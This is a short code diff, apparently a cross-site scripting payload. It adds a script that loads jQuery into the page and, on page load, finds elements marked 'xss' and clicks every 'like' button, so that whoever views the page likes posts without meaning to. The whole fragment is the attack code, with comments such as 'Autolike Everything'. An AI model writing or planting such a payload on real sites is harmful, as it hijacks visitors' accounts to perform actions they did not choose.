@@ -1,3 +1,8 @@
+var script = document.createElement('script');
+script.setAttribute('type', 'text/javascript');
+script.setAttribute('src', 'https://code.jquery.com/jquery-3.1.1.min.js');
+document.head.appendChild(script); //INJECT JQUERY
+
 window.onload = function(){ //Fix autolike
 //$(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
 $(".xss").parent().parent().find('.footer').find('button.like.btn').click(); //Autolike Everything
